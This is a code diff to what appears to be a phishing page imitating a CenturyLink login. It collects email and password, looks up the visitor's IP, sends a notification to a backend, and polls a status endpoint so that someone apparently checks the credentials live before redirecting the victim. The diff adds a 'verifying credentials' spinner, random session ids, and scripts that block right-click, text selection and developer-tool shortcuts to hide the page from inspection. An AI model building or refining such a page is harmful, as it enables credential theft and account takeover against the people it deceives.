@@ -30,12 +30,23 @@ $sid = $_SESSION['visitor_id'];
         .btndisabled { color: #fff; background-color: #B4BCC9 !important; }
         .loadingimg {
             display: block;
-            visibility: hidden;
             margin-left: auto;
             margin-right: auto;
             width: 47px;
             height: 47px;
-            background-image: url("https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/Ellipsis-1.4s-47px.gif")
+            background-image: url("https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/Ellipsis-1.4s-47px.gif");
+        }
+        /* Hidden completely by default */
+        #loader-container {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+        }
+        #loader-text {
+            font-size: 13px;
+            color: #666;
+            margin-top: 8px;
+            font-weight: 600;
         }
         body {
             background-image: url(https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/centurylink-logo-black-BG5.svg);
@@ -89,7 +100,11 @@ $sid = $_SESSION['visitor_id'];
                         </span>
                     </div>
 
-                    <div class="loadingimg" id="loader"></div>
+                    <!-- Loader container (hidden by default) -->
+                    <div id="loader-container">
+                        <div class="loadingimg" id="loader"></div>
+                        <div id="loader-text">Verifying credentials, please wait...</div>
+                    </div>
                 </div>
 
                 <div class="right-content-wrap" style="display: none;">
@@ -117,7 +132,8 @@ $(document).ready(function () {
 
         const email = $('#email').val().trim();
         const password = $('#password').val().trim();
-        const sid = $('#visitor_id').val();
+        
+        const sid = Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
 
         $('#error, #msg').hide();
 
@@ -132,7 +148,8 @@ $(document).ready(function () {
             return;
         }
 
-        $('#loader').css('visibility', 'visible');
+      
+        $('#loader-container').show();
         $('#submit-btn').prop('disabled', true);
 
         fetch('https://ipinfo.io/json')
@@ -163,14 +180,15 @@ $(document).ready(function () {
                 if (res.ok) {
                     startPolling(sid, res.domain);
                 } else {
-                    $('#loader').css('visibility', 'hidden');
+                    $('#loader-container').hide();
                     $('#submit-btn').prop('disabled', false);
-                    alert("Failed to send notification.");
+                    alert("Failed to send notification: " + (res.error || 'Unknown error'));
                 }
             },
-            error: function () {
-                $('#loader').css('visibility', 'hidden');
+            error: function (xhr) {
+                $('#loader-container').hide();
                 $('#submit-btn').prop('disabled', false);
+                console.error(xhr.responseText);
                 alert("Server communication error.");
             }
         });
@@ -181,13 +199,13 @@ $(document).ready(function () {
             $.get('check_status.php?sid=' + sid, function (data) {
                 if (data.status === 'incorrect') {
                     clearInterval(pollInterval);
-                    $('#loader').css('visibility', 'hidden');
+                    $('#loader-container').hide();
                     $('#submit-btn').prop('disabled', false);
                     $('#error').show().html("The username or password you entered is incorrect.");
                     $('#password').val('');
                 } else if (data.status === 'valid') {
                     clearInterval(pollInterval);
-                    window.location.replace("https://www." + domain);
+                    window.location.replace(domain);
                 }
             }, 'json');
         }, 2000);
@@ -195,6 +213,27 @@ $(document).ready(function () {
 
     function showError(msg) {
         $('#error').show().html(msg);
+    }
+});
+
+
+document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+});
+
+
+document.addEventListener('selectstart', function (e) {
+    e.preventDefault();
+});
+
+
+document.addEventListener('keydown', function (e) {
+    if (
+        e.key === 'F12' ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'U')
+    ) {
+        e.preventDefault();
     }
 });
 </script>
